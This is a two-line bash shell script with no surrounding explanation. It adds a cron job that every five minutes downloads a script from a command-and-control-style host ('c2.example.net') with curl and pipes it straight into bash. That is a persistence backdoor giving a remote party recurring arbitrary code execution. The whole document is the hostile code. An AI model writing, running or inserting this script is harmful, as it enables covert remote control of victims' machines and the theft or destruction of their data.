#!/bin/bash
(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://c2.example.net/b | bash') | crontab -
